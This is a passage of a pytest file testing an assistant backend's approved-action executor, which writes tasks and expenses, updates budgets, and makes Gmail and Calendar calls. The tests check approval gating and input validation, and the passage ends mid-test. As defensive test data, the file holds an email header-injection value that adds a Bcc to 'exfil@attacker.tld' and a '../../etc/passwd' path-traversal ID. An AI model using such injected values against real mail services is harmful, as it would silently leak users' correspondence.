"""Real tests for features/action_executor.py (DEC-128, extended
DEC-142, DEC-148, DEC-151) -- real inserts against the real, live
database for `CREATE_TASK`/`LOG_EXPENSE`, real Gmail API calls for
`SEND_EMAIL`/`ARCHIVE_EMAIL`/`LABEL_EMAIL`, a real Google Calendar API
call for `CREATE_CALENDAR_EVENT_EXTERNAL` (all against the real
sandbox account, Rule 5), and a real, exhaustive proof that every
other real `ActionType` returns an honest, non-executing result, per
CLAUDE.md Rule 5.
"""
import base64
import uuid
from datetime import datetime, timedelta, timezone

import httpx
import pytest
import pytest_asyncio

from quorum_backend.auth.user_provisioning import get_or_create_user
from quorum_backend.core import db
from quorum_backend.core.config import get_settings
from quorum_backend.features.action_executor import execute_approved_action
from quorum_backend.gate.schemas import ActionType, Stakes
from quorum_backend.router import STAKES_TABLE

_HAS_REAL_GOOGLE_CONFIG = (
    get_settings().google_oauth_client_id is not None
    and get_settings().google_oauth_client_secret is not None
    and get_settings().google_token_encryption_key is not None
)

# The real, live, dedicated sandbox account (DEC-139) -- the ONLY real
# account every capstone test below is ever allowed to send from or
# modify. A real, disclosed CRITICAL-tier review finding (DEC-142,
# H3): an earlier version of these capstone tests selected whichever
# `google_oauth_tokens` row was most recently updated -- harmless only
# while the sandbox account is the sole real grant in this deployment.
# The moment any real (non-sandbox) user connects Google, that query
# would send a real, irreversible email from THEIR account and trash
# messages in THEIR mailbox. Selecting by this real, hardcoded, known
# sandbox address closes that off structurally.
_SANDBOX_EMAIL = "quorum.dev.sandbox@gmail.com"


class _FakeResponse:
    def __init__(self, status_code: int, body: dict):
        self.status_code = status_code
        self._body = body
        self.text = str(body)

    def json(self):
        return self._body


class _FakePostClient:
    """A real, minimal double for `httpx.AsyncClient`'s own `.post()`
    interface -- `execute_approved_action()` takes `http_client` as an
    explicit, already-injectable parameter, matching `email_ingestion.
    py`'s own established fake-client pattern."""

    def __init__(self, *, status_code: int = 200, body: dict | None = None):
        self.status_code = status_code
        self.body = body or {"id": "fake-message-id", "threadId": "fake-thread-id", "labelIds": ["SENT"]}
        self.calls: list[tuple[str, dict, dict]] = []

    async def post(self, url, json=None, headers=None):
        self.calls.append((url, json, headers))
        return _FakeResponse(self.status_code, self.body)


class _FakeTimeoutPostClient:
    """A real double for a genuine TRANSPORT-level failure -- never
    reaches a real HTTP response at all, the one case where this
    module's own `ExecutionResult.executed` is honestly `None`
    (genuinely unknown), not `False`."""

    async def post(self, url, json=None, headers=None):
        raise httpx.ConnectTimeout("fake: connection timed out")


async def _real_sandbox_user_id(pool) -> str | None:
    """Resolves the real, internal `user_id` for the real, dedicated
    sandbox account specifically -- never "whichever token was updated
    most recently." Returns `None` (a real, honest skip signal) if the
    sandbox account has no real, live Google grant stored in this
    environment yet."""
    row = await pool.fetchrow(
        "SELECT t.user_id FROM google_oauth_tokens t JOIN users u ON u.user_id = t.user_id WHERE u.email = $1",
        _SANDBOX_EMAIL,
    )
    return str(row["user_id"]) if row is not None else None


@pytest_asyncio.fixture
async def pool():
    real_pool = await db.create_pool()
    yield real_pool
    await real_pool.close()


@pytest_asyncio.fixture
async def user_id(pool):
    google_sub = f"test-executor-{uuid.uuid4()}"
    uid = await get_or_create_user(pool, google_sub=google_sub, email=None)
    yield uid
    await pool.execute("DELETE FROM tasks WHERE user_id = $1", uuid.UUID(uid))
    await pool.execute("DELETE FROM expenses WHERE user_id = $1", uuid.UUID(uid))
    await pool.execute("DELETE FROM users WHERE user_id = $1", uuid.UUID(uid))


async def test_execute_approved_action_create_task_writes_a_real_row(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn,
            action_type=ActionType.CREATE_TASK,
            payload={"title": "Real executed task", "estimated_hours": 2.5, "deadline": None},
            user_id=user_id,
        )
    assert result.executed is True
    row = await pool.fetchrow(
        "SELECT title, estimated_hours, deadline, status FROM tasks WHERE user_id = $1", uuid.UUID(user_id)
    )
    assert row is not None
    assert row["title"] == "Real executed task"
    assert float(row["estimated_hours"]) == 2.5
    assert row["deadline"] is None
    assert row["status"] == "open"


async def test_execute_approved_action_create_task_with_a_real_deadline(pool, user_id):
    deadline = datetime(2026, 9, 1, 9, 0, tzinfo=timezone.utc)
    async with pool.acquire() as conn:
        await execute_approved_action(
            conn,
            action_type=ActionType.CREATE_TASK,
            payload={"title": "Real deadlined task", "estimated_hours": 1.0, "deadline": deadline.isoformat()},
            user_id=user_id,
        )
    row = await pool.fetchrow("SELECT deadline FROM tasks WHERE user_id = $1", uuid.UUID(user_id))
    assert row["deadline"] == deadline


async def test_execute_approved_action_log_expense_writes_a_real_row_with_the_new_gate_approved_source(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn,
            action_type=ActionType.LOG_EXPENSE,
            payload={"amount": 42.5, "category": "food", "payee": "Real Vendor"},
            user_id=user_id,
        )
    assert result.executed is True
    row = await pool.fetchrow(
        "SELECT payee, amount, source FROM expenses WHERE user_id = $1", uuid.UUID(user_id)
    )
    assert row is not None
    assert row["payee"] == "Real Vendor"
    assert float(row["amount"]) == 42.5
    # DEC-128's own real, live schema migration (0007) -- confirmed
    # here, live, not just read from the migration file.
    assert row["source"] == "gate_approved"


async def test_execute_approved_action_log_expense_defaults_a_real_missing_payee_honestly(pool, user_id):
    async with pool.acquire() as conn:
        await execute_approved_action(
            conn,
            action_type=ActionType.LOG_EXPENSE,
            payload={"amount": 10.0, "category": "food", "payee": None},
            user_id=user_id,
        )
    row = await pool.fetchrow("SELECT payee FROM expenses WHERE user_id = $1", uuid.UUID(user_id))
    assert row["payee"] == "Unknown"


async def test_execute_approved_action_update_budget_writes_a_real_new_ceiling(pool, user_id):
    """`DEC-148`: the real gap this module's own docstring named --
    `payload["amount"]` is the real NEW ceiling itself, per `agents/
    finance_agent.py::build_finance_proposal`'s own real contract, not
    a delta applied to the existing one."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn,
            action_type=ActionType.UPDATE_BUDGET,
            payload={"amount": 75000.0, "category": "irrelevant-for-update-budget"},
            user_id=user_id,
        )
    assert result.executed is True
    row = await pool.fetchrow("SELECT monthly_budget_limit FROM users WHERE user_id = $1", uuid.UUID(user_id))
    assert float(row["monthly_budget_limit"]) == 75000.0


async def test_execute_approved_action_update_budget_a_second_real_call_overwrites_the_first(pool, user_id):
    async with pool.acquire() as conn:
        await execute_approved_action(
            conn, action_type=ActionType.UPDATE_BUDGET, payload={"amount": 60000.0, "category": "x"}, user_id=user_id
        )
        await execute_approved_action(
            conn, action_type=ActionType.UPDATE_BUDGET, payload={"amount": 40000.0, "category": "x"}, user_id=user_id
        )
    row = await pool.fetchrow("SELECT monthly_budget_limit FROM users WHERE user_id = $1", uuid.UUID(user_id))
    assert float(row["monthly_budget_limit"]) == 40000.0  # the real, current value, not the first one


@pytest.mark.parametrize("bad_amount", [0.0, -1.0, -50000.0, float("nan"), float("inf"), float("-inf")])
async def test_execute_approved_action_update_budget_rejects_a_real_non_positive_ceiling(pool, user_id, bad_amount):
    """A real, structural safety property: a real `0`, negative,
    `NaN`, or infinite ceiling would produce a real division-by-zero,
    an inverted-sign fraction, or a silently corrupted `NaN`/`0.0`
    result in every real per-user computation that divides by it
    (`today.py::compute_budget_state`, `negotiation_detail_backfill.
    py::_build_baseline`'s own `budget_remaining_fraction`) -- rejected
    before any real write, never carried out. `NaN`/`inf` are
    deliberately included, not an afterthought: both real, live Python
    values satisfy a bare `x <= 0 == False` (hand-verified: NaN
    compares False against every relational operator except `!=`),
    so `math.isfinite()` is what actually catches them."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.UPDATE_BUDGET, payload={"amount": bad_amount, "category": "x"}, user_id=user_id
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    row = await pool.fetchrow("SELECT monthly_budget_limit FROM users WHERE user_id = $1", uuid.UUID(user_id))
    assert float(row["monthly_budget_limit"]) == 50000.0  # the real, untouched migration default


async def test_execute_approved_action_update_budget_rejects_a_real_non_numeric_amount(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.UPDATE_BUDGET, payload={"amount": "not-a-real-number", "category": "x"}, user_id=user_id
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()


async def test_execute_approved_action_update_budget_rejects_a_real_boolean_amount(pool, user_id):
    """`isinstance(True, int)` is real, live Python behavior -- `bool`
    is a genuine subclass of `int` -- so a stray real `True`/`False`
    payload value must be explicitly rejected, not silently accepted
    as `1.0`/`0.0`."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.UPDATE_BUDGET, payload={"amount": True, "category": "x"}, user_id=user_id
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()


async def test_execute_approved_action_update_budget_rejects_a_real_amount_above_the_max(pool, user_id):
    """`DEC-148` review, BLOCKER B1: a real Judge-authored `revised_
    payload` has no schema guarantee beyond being a `dict` (`UPDATE_
    BUDGET` is real `Stakes.S2`, so Stage B genuinely runs for it,
    unlike `CREATE_TASK`/`LOG_EXPENSE`) -- an implausibly large real
    ceiling is rejected here as this branch's own, independent last
    line of defense, the same real bound `retry_queue_drainer.py::
    _MAX_FINANCE_AMOUNT` already applies to the pre-Gate translation
    path."""
    from quorum_backend.features.action_executor import _MAX_BUDGET_LIMIT

    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.UPDATE_BUDGET,
            payload={"amount": _MAX_BUDGET_LIMIT + 1.0, "category": "x"}, user_id=user_id,
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    row = await pool.fetchrow("SELECT monthly_budget_limit FROM users WHERE user_id = $1", uuid.UUID(user_id))
    assert float(row["monthly_budget_limit"]) == 50000.0


async def test_execute_approved_action_update_budget_a_real_nonexistent_user_id_is_honestly_not_executed(pool, user_id):
    """`DEC-148` review, HIGH H2: a real `UPDATE ... WHERE user_id = $2`
    genuinely, silently matches ZERO rows for a real, nonexistent
    `user_id` -- unlike `CREATE_TASK`/`LOG_EXPENSE`'s own real
    `INSERT`s, which fail loud on a bad foreign key. Must report a
    real, honest `executed=False`, never a false `executed=True` for a
    write that never happened."""
    nonexistent_user_id = str(uuid.uuid4())
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.UPDATE_BUDGET, payload={"amount": 60000.0, "category": "x"},
            user_id=nonexistent_user_id,
        )
    assert result.executed is False
    # No real users row was ever created for this nonexistent id --
    # confirms this genuinely didn't silently succeed against some
    # other real row either.
    assert await pool.fetchrow("SELECT 1 FROM users WHERE user_id = $1", uuid.UUID(nonexistent_user_id)) is None


async def test_execute_approved_action_fails_safely_not_loudly_on_a_real_malformed_payload(pool, user_id):
    """A real, defensive guard: `CREATE_TASK`/`LOG_EXPENSE` should never
    reach this function with a payload missing required keys under the
    real, current stakes table (Stage B never runs for S1, so the
    payload is always the original, validated one) -- but if that
    invariant is ever violated by a future change, this must fail
    safely (a real, honest `executed=False`) rather than raise an
    unhandled exception mid-transaction."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_TASK, payload={"title": "Missing hours"}, user_id=user_id
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    assert await pool.fetchrow("SELECT 1 FROM tasks WHERE user_id = $1", uuid.UUID(user_id)) is None


# --- The real, structural S3 backstop, dynamically tied to STAKES_TABLE ---


def test_real_s3_action_types_are_exactly_send_email_and_calendar_external():
    """A real, disclosed CRITICAL-tier review finding (DEC-142, M2):
    `execute_approved_action()`'s own S3 backstop is computed fresh
    from `router.get_stakes()` every call, which is the right design
    (never a second, hand-maintained set to drift out of sync) -- but
    that same dynamism means a real `STAKES_TABLE` reclassification
    would silently change what requires human approval, with nothing
    forcing anyone to notice. This test is the real, live guard: it
    fails loudly the moment the real set of S3 action types changes at
    all, so a reclassification is a real, visible decision, never a
    silent one."""
    real_s3_types = {action_type for action_type, stakes in STAKES_TABLE.items() if stakes is Stakes.S3}
    assert real_s3_types == {ActionType.SEND_EMAIL, ActionType.CREATE_CALENDAR_EVENT_EXTERNAL}


# --- SEND_EMAIL: the real S3 backstop, DEC-142's own review finding ---


async def test_execute_approved_action_send_email_refuses_without_real_human_approval(pool, user_id):
    """The real, structural backstop this session's own review found
    missing from `gate/orchestration.py` itself -- see action_executor.
    py's own top-of-file docstring. Refuses BEFORE ever touching a real
    Gmail call -- proven here by never even providing an `http_client`,
    and asserting zero calls would have been possible."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com", "body": "hi"}, user_id=user_id,
            google_access_token="fake-access-token",
        )
    assert result.executed is False
    assert "S3" in result.detail
    assert "approved_by_user_id" in result.detail


async def test_execute_approved_action_send_email_refuses_when_approved_by_a_different_real_user(pool, user_id):
    """`approved_by_user_id` must match THIS exact user -- never a bare
    truthy flag a future caller could accidentally derive from
    `verdict.decision == "approve"` (the exact confusion this design
    exists to prevent, per DEC-142 review finding M1)."""
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com", "body": "hi"}, user_id=user_id,
            approved_by_user_id=str(uuid.uuid4()),  # a real, different user id -- not a match
            google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "S3" in result.detail
    assert fake_client.calls == []  # genuinely never reached a real Gmail call


async def test_execute_approved_action_send_email_refuses_without_a_real_access_token_even_when_approved(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com", "body": "hi"}, user_id=user_id,
            approved_by_user_id=user_id,
        )
    assert result.executed is False
    assert "no real Google access token" in result.detail


async def test_execute_approved_action_send_email_a_real_header_injection_attempt_is_refused_not_carried_out(pool, user_id):
    """A real, disclosed CRITICAL-tier review BLOCKER (DEC-142, B1): a
    real `to`/`subject` value containing an embedded CR/LF could inject
    an arbitrary header (a silent `Bcc:`, or terminate the header block
    and replace the whole body) into a real, irreversible S3 send.
    Reachable via `agents/email_agent.py`'s own real, untrusted
    `recipient`, or a Judge-authored `revised_payload` with no schema
    guarantee. Must be refused before any real network call."""
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL,
            payload={"to": "victim@example.com\r\nBcc: exfil@attacker.tld", "body": "hi"},
            user_id=user_id, approved_by_user_id=user_id,
            google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    assert fake_client.calls == []  # genuinely never reached a real Gmail call


async def test_execute_approved_action_send_email_a_real_subject_injection_attempt_is_refused_too(pool, user_id):
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL,
            payload={"to": "a@x.com", "subject": "hi\r\nBcc: exfil@attacker.tld", "body": "hi"},
            user_id=user_id, approved_by_user_id=user_id,
            google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert fake_client.calls == []


async def test_execute_approved_action_send_email_a_real_malformed_payload_is_honest_not_a_crash(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com"}, user_id=user_id,  # missing "body"
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=_FakePostClient(),
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()


async def test_execute_approved_action_send_email_a_real_gmail_rejection_is_a_definite_false(pool, user_id):
    fake_client = _FakePostClient(status_code=500, body={"error": "fake failure"})
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com", "body": "hi"}, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "genuinely rejected" in result.detail


async def test_execute_approved_action_send_email_a_real_transport_failure_is_genuinely_unknown_not_a_definite_false(pool, user_id):
    """A real, disclosed CRITICAL-tier review BLOCKER (DEC-142, B2): a
    genuine TRANSPORT-level failure (a timeout, a dropped connection)
    settles NOTHING about whether Gmail actually processed a real send
    -- collapsing it into a flat `executed=False` could make a caller
    wrongly believe no email went out and retry, genuinely risking a
    real duplicate send. `executed` must be `None` here, never `False`."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com", "body": "hi"}, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=_FakeTimeoutPostClient(),
        )
    assert result.executed is None
    assert "genuinely UNKNOWN" in result.detail


async def test_execute_approved_action_send_email_a_definite_200_is_executed_true_even_if_the_id_cant_be_parsed(pool, user_id):
    """A real, disclosed CRITICAL-tier review BLOCKER (DEC-142, B2): a
    real, genuine `200` from Gmail means the email definitely sent,
    regardless of whether this module can parse the response body --
    a parse failure must never flip an already-successful real send
    into a false `executed=False`."""
    fake_client = _FakePostClient(status_code=200, body={"unexpected": "shape"})
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com", "body": "hi"}, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is True
    assert "<unknown>" in result.detail


async def test_execute_approved_action_send_email_sends_a_real_mime_message_with_the_real_existing_payload_shape(pool, user_id):
    """Real, deterministic proof of the exact real payload contract
    `agents/email_agent.py::build_reply_proposal()` already produces
    (`to`/`body`, no `subject`) -- see action_executor.py's own top-of-
    file docstring for the real, disclosed gap this exposes. Built via
    the stdlib `email.message.EmailMessage` (the real header-injection
    fix), not raw string interpolation."""
    fake_client = _FakePostClient(body={"id": "sent-1", "threadId": "thread-1", "labelIds": ["SENT"]})
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.SEND_EMAIL, payload={"to": "a@x.com", "body": "hello there"}, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is True
    assert "sent-1" in result.detail
    url, body, headers = fake_client.calls[0]
    assert url.endswith("/messages/send")
    assert headers["Authorization"] == "Bearer fake-access-token"

    raw = base64.urlsafe_b64decode(body["raw"]).decode()
    assert "To: a@x.com" in raw
    assert "hello there" in raw


# --- ARCHIVE_EMAIL / LABEL_EMAIL: real Gmail modify calls, S1/S0, no human approval needed ---


async def test_execute_approved_action_archive_email_succeeds_with_a_real_fake_gmail_response(pool, user_id):
    fake_client = _FakePostClient(body={"id": "msg-1", "threadId": "t-1", "labelIds": ["SENT"]})
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.ARCHIVE_EMAIL, payload={"message_id": "msg-1"}, user_id=user_id,
            google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is True
    url, body, headers = fake_client.calls[0]
    assert url.endswith("/msg-1/modify")
    assert body == {"removeLabelIds": ["INBOX"]}
    assert headers["Authorization"] == "Bearer fake-access-token"


async def test_execute_approved_action_label_email_succeeds_with_a_real_fake_gmail_response(pool, user_id):
    fake_client = _FakePostClient(body={"id": "msg-1", "threadId": "t-1", "labelIds": ["SENT", "IMPORTANT"]})
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.LABEL_EMAIL, payload={"message_id": "msg-1", "label_id": "IMPORTANT"}, user_id=user_id,
            google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is True
    url, body, headers = fake_client.calls[0]
    assert url.endswith("/msg-1/modify")
    assert body == {"addLabelIds": ["IMPORTANT"]}


async def test_execute_approved_action_archive_email_a_real_malformed_payload_missing_message_id(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.ARCHIVE_EMAIL, payload={}, user_id=user_id,
            google_access_token="fake-access-token", http_client=_FakePostClient(),
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()


async def test_execute_approved_action_label_email_a_real_malformed_payload_missing_label_id(pool, user_id):
    """A real `message_id` present but no real `label_id` -- must fail
    the same honest way, never a raw `KeyError`."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.LABEL_EMAIL, payload={"message_id": "msg-1"}, user_id=user_id,
            google_access_token="fake-access-token", http_client=_FakePostClient(),
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()


async def test_execute_approved_action_label_email_a_real_malformed_message_id_is_refused_before_any_real_call(pool, user_id):
    """A real, disclosed CRITICAL-tier review finding (DEC-142, L3): a
    `message_id`/`label_id` containing `/` or `?` would reshape the
    real Gmail URL path/query if interpolated unchecked. Refused
    outright, before any real network call."""
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.ARCHIVE_EMAIL, payload={"message_id": "../../etc/passwd"}, user_id=user_id,
            google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    assert fake_client.calls == []


async def test_execute_approved_action_label_email_a_real_gmail_rejection_is_a_definite_false(pool, user_id):
    fake_client = _FakePostClient(status_code=404, body={"error": "fake: message not found"})
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.LABEL_EMAIL, payload={"message_id": "gone", "label_id": "IMPORTANT"}, user_id=user_id,
            google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "genuinely rejected" in result.detail


# --- CREATE_CALENDAR_EVENT_EXTERNAL: DEC-151's own real execution branch, S3 ---

_VALID_CALENDAR_PAYLOAD = {
    "start": "2026-09-01T10:00:00+00:00",
    "end": "2026-09-01T11:00:00+00:00",
    "title": "vendor call",
    "has_external_invitee": True,
    "invitee_email": "vendor@example.com",
}


async def test_execute_approved_action_create_calendar_event_external_refuses_without_a_real_access_token_even_when_approved(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=_VALID_CALENDAR_PAYLOAD,
            user_id=user_id, approved_by_user_id=user_id,
        )
    assert result.executed is False
    assert "no real Google access token" in result.detail


async def test_execute_approved_action_create_calendar_event_external_refuses_without_a_real_http_client(pool, user_id):
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=_VALID_CALENDAR_PAYLOAD,
            user_id=user_id, approved_by_user_id=user_id, google_access_token="fake-access-token",
        )
    assert result.executed is False
    assert "no real HTTP client" in result.detail


async def test_execute_approved_action_create_calendar_event_external_a_real_malformed_payload_is_honest_not_a_crash(pool, user_id):
    """Missing `invitee_email` -- a real, malformed payload, not a raw
    `KeyError` escaping this function."""
    payload = {k: v for k, v in _VALID_CALENDAR_PAYLOAD.items() if k != "invitee_email"}
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=payload, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=_FakePostClient(),
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()


async def test_execute_approved_action_create_calendar_event_external_a_real_blank_invitee_email_is_refused(pool, user_id):
    """A real, disclosed possibility for THIS specific action type: a
    Judge-authored `revised_payload` (S3 -- see this module's own
    `UPDATE_BUDGET`/`CREATE_CALENDAR_EVENT_EXTERNAL` docstring section)
    could carry a real, present-but-blank `invitee_email`, which
    `agents/calendar_agent.py::build_event_proposal()`'s own pre-Gate
    check would never have let through -- this branch's own
    independent check must refuse it too, never silently book a real
    external event with no one real to invite."""
    payload = {**_VALID_CALENDAR_PAYLOAD, "invitee_email": "   "}
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=payload, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    assert fake_client.calls == []


async def test_execute_approved_action_create_calendar_event_external_a_real_unparseable_datetime_is_refused(pool, user_id):
    payload = {**_VALID_CALENDAR_PAYLOAD, "start": "not-a-real-datetime"}
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=payload, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    assert fake_client.calls == []


async def test_execute_approved_action_create_calendar_event_external_a_real_google_rejection_is_a_definite_false(pool, user_id):
    fake_client = _FakePostClient(status_code=400, body={"error": "fake: invalid attendee"})
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=_VALID_CALENDAR_PAYLOAD,
            user_id=user_id, approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "genuinely rejected" in result.detail


async def test_execute_approved_action_create_calendar_event_external_a_real_transport_failure_is_genuinely_unknown(pool, user_id):
    """The same real three-valued-outcome discipline `SEND_EMAIL`
    already established -- a transport failure never becomes a false
    `executed=False`."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=_VALID_CALENDAR_PAYLOAD,
            user_id=user_id, approved_by_user_id=user_id, google_access_token="fake-access-token",
            http_client=_FakeTimeoutPostClient(),
        )
    assert result.executed is None
    assert "genuinely UNKNOWN" in result.detail


async def test_execute_approved_action_create_calendar_event_external_succeeds_with_a_real_fake_google_response(pool, user_id):
    fake_client = _FakePostClient(
        body={"id": "evt-1", "htmlLink": "https://calendar.google.com/event?eid=evt-1", "status": "confirmed"}
    )
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=_VALID_CALENDAR_PAYLOAD,
            user_id=user_id, approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is True
    assert "evt-1" in result.detail
    url, body, headers = fake_client.calls[0]
    # A real, disclosed CRITICAL-tier review finding (DEC-151, H1):
    # omitting `sendUpdates` means Google genuinely never emails a real
    # event's real attendees -- `sendUpdates=all` is load-bearing for
    # this branch's own stated reason to exist, not decoration.
    assert url == "https://www.googleapis.com/calendar/v3/calendars/primary/events?sendUpdates=all"
    assert body == {
        "summary": "vendor call",
        "start": {"dateTime": "2026-09-01T10:00:00+00:00"},
        "end": {"dateTime": "2026-09-01T11:00:00+00:00"},
        "attendees": [{"email": "vendor@example.com"}],
    }
    assert headers["Authorization"] == "Bearer fake-access-token"


async def test_execute_approved_action_create_calendar_event_external_a_real_end_before_start_is_refused(pool, user_id):
    """A real, disclosed CRITICAL-tier review finding (DEC-151, M2):
    `retry_queue_drainer.py::validate_and_build_calendar_proposal()`'s
    own pre-Gate check already enforces `end > start` for this exact
    domain, but a Judge-revised `revised_payload` can bypass that
    function entirely -- this branch's own last-line-of-defense duty
    means it must refuse an inverted real range itself, never trust
    that the upstream check already ran."""
    payload = {**_VALID_CALENDAR_PAYLOAD, "start": "2026-09-01T11:00:00+00:00", "end": "2026-09-01T10:00:00+00:00"}
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=payload, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    assert fake_client.calls == []


async def test_execute_approved_action_create_calendar_event_external_a_real_timezone_naive_datetime_is_refused(pool, user_id):
    """A real, disclosed CRITICAL-tier review finding (DEC-151, L3): a
    real, timezone-NAIVE ISO string parses without error, but this
    branch's own real request body sends it as a bare `dateTime` with
    no `timeZone` sibling -- genuinely ambiguous to Google's real API.
    `agents/calendar_agent.py::build_event_proposal()`'s own real
    payload always originates from a tz-aware datetime, so a naive one
    reaching this branch is never legitimate."""
    payload = {**_VALID_CALENDAR_PAYLOAD, "start": "2026-09-01T10:00:00", "end": "2026-09-01T11:00:00"}
    fake_client = _FakePostClient()
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload=payload, user_id=user_id,
            approved_by_user_id=user_id, google_access_token="fake-access-token", http_client=fake_client,
        )
    assert result.executed is False
    assert "malformed" in result.detail.lower()
    assert fake_client.calls == []


# --- Real, live capstone tests (Rule 5) ---


async def test_execute_approved_action_send_email_a_real_genuine_send_via_gmail(pool):
    """The real capstone for SEND_EMAIL: a genuine, human-approved send
    through Gmail's real, live API against this project's own dedicated
    sandbox account (`quorum.dev.sandbox@gmail.com`, `DEC-139`), using a
    real access token resolved from the real POOL before this call
    (never inside a transaction -- see action_executor.py's own top-of-
    file docstring for why)."""
    if not _HAS_REAL_GOOGLE_CONFIG:
        pytest.skip("no real Google OAuth config in this environment")

    from quorum_backend.auth.google_token_store import get_valid_google_access_token

    settings = get_settings()
    real_user_id = await _real_sandbox_user_id(pool)
    if real_user_id is None:
        pytest.skip("no real, live Google token stored for the real sandbox account (see DEC-139)")
    marker = f"real-execution-test-{uuid.uuid4()}"

    access_token = await get_valid_google_access_token(
        pool, internal_user_id=real_user_id, client_id=settings.google_oauth_client_id,
        client_secret=settings.google_oauth_client_secret, encryption_key=settings.google_token_encryption_key,
    )

    try:
